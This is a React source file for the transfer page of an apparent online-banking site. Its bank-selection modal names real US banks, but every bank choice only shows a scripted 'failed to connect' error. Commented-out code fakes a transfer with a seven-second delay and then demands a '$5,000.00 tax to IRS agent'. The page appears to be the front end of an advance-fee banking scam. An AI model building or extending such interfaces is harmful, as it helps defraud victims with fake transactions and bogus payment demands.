import menu from "../assets/menu.png";
import { Link } from "react-router-dom";
import "./css/auth.css";
import { useState } from "react";
import { toast } from "react-toastify";
// import { wait } from "../utils/waiter";
import logo from "../assets/logo.svg"
import { PaymentOptions } from "./payment.component";


// type TransferType = {
//     accNum: string,
//     accName: string,
//     routine: string,
//     amount: number,
// }

export default function Transfer() {
    // const [formInput, setFormInput] = React.useState<TransferType>({
    // const [_, setFormInput] = React.useState<TransferType>({
    //     accName: "",
    //     accNum: "",
    //     routine: "",
    //     amount: 0
    // });
    // const [isLoading, setIsLoading] = React.useState(false);



    // function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    //     setFormInput((prevData) => ({
    //         ...prevData,
    //         [event.target.name]: event.target.value
    //     }))
    // }

    // async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    //     event.preventDefault();
    //     if (formInput.amount < 100) {
    //         return toast.error("Amount cannot be less than 100")
    //     }
    //     setIsLoading(true);
    //     await wait(7000);
    //     setIsLoading(false);
    //     toast.error("You have to pay $5,000.00 tax to IRS agent")
    // }


    const [showModal, setShowModal] = useState(false);

  const banks = [
    { name: "Chase", logo: "/logos/ch-logo.png" },
    { name: "Bank of America", logo: "/logos/bo-logo.svg" },
    { name: "Capital One", logo: "/logos/cp-logo.png" },
    { name: "Wellsfargo", logo: "/logos/wells-logo.png" },
    // { name: "First Bank", logo: "/logos/logo.svg" },
    // { name: "Sterling Bank", logo: "/logos/logo.svg" },
  ];

   const handlePaymentSelect = (method: "card" | "bank" | "wire") => {
    if(method == "bank"){
      setShowModal(true);
    }
    console.log("User selected payment method:", method);
    // Example: you could show a form or trigger payment logic here
  };

    return (
        <div>

            {/* Modal */}
      {showModal && (
        <div className="bank-modal-overlay" onClick={() => setShowModal(false)}>
          <div
            className="bank-modal"
            onClick={(e) => e.stopPropagation()} // prevent closing when clicking inside
          >
            <div className="bank-modal-header">
              <h2>Choose your bank</h2>
              <button
                  className="close-btn"
                  onClick={() => setShowModal(false)}
                  aria-label="Close modal"
                >
                  &times;
                </button>
              <p>Connect securely to your financial institution</p>
            </div>

            <div className="bank-search">
              <input type="text" placeholder="Search for your bank..." />
            </div>

            <div className="bank-list">
              {banks.map((bank, i) => (
                <div
                  className="bank-item"
                  key={i}
                  onClick={() => {
                    toast.error("Failed to connect to financial institution, Please try another options")
                    setShowModal(false);
                  }}
                >
                  <img src={bank.logo} alt={bank.name} />
                  <span>{bank.name}</span>
                </div>
              ))}
            </div>

            <div className="bank-modal-footer">
              <p>
                Can't find your bank? <a href="#">Report a missing bank</a>
              </p>
            </div>
          </div>
        </div>
      )}
            {/* Modal ends here */}

            <div className="dashboard-nav">
                <div style={{ height: 30, marginLeft: 20 }}>
                    <img style={{ height: "100%", objectFit: "contain" }} src={menu} alt="" />
                </div>
                <img src={logo} width={80} alt="" />
                {/* <div className="audiowide">TrustFund Home</div> */}
                
                <div>
                    <Link style={{ marginRight: 20, color: "white" }} to={"/login"}>Logout</Link>
                </div>
                
            </div>
            <div className="" style={{ minHeight: "70vh", display: "flex", justifyContent: "center", alignItems: "center", marginBottom: "20px" }}>


                <div className="auth-container">


                    <div className="auth-form-container">
                        <div style={{ "paddingTop": "30px" }} className="heading">
                            <Link style={{ marginLeft: "40px", fontWeight: "bold", fontSize: "18px", textTransform: "lowercase" }} to={"/dashboard"}>≪ back</Link>
                            <h1 style={{ "fontWeight": "bolder", "fontSize": "20px", "textAlign": "center" }}>
                                Payment Options
                            </h1>
                        </div>
                        <div style={{display:"flex", alignItems:"center", justifyContent:"center"}}>
                        <PaymentOptions onSelect={handlePaymentSelect}/>
                        </div>
                        {/* <form onSubmit={handleSubmit} style={{ "padding": "20px 40px 40px 40px" }} action="" method="POST">

                            <div className="field">
                                <label className="label">Bank Account Number</label>
                                <div className="control">
                                    <input onChange={handleInputChange} value={formInput.accNum} type="text" name='accNum' className="input is-medium" required />
                                </div>
                            </div>
                            <div className="field">
                                <label className="label">Bank Routine Number</label>
                                <div className="control">
                                    <input onChange={handleInputChange} value={formInput.routine} type="text" name='routine' className="input is-medium" required />
                                </div>
                            </div>
                            <div className="field">
                                <label className="label">Account Name</label>
                                <div className="control">
                                    <input onChange={handleInputChange} value={formInput.accName} type="text" name='accName' className="input is-medium" required />
                                </div>
                            </div>
                            <div className="field">
                                <label className="label">Amount</label>
                                <div className="control">
                                    <input onChange={handleInputChange} value={formInput.amount} type="number" name='amount' className="input is-medium" required />
                                </div>
                            </div>


                            <div style={{ "marginTop": "20px;" }} className="field is-grouped">
                                <div style={{ "width": "100%" }} className="control">
                                    <div className="gradient-button">
                                        {!isLoading ?


                                            <button type="submit" >
                                                Transfer
                                            </button>
                                            :
                                            <button type="button" >
                                                Transaction in progress.......
                                            </button>}
                                    </div>
                                </div>
                            </div>

                        </form> */}
                    </div>


                </div>

            </div>

        </div>
    )
}
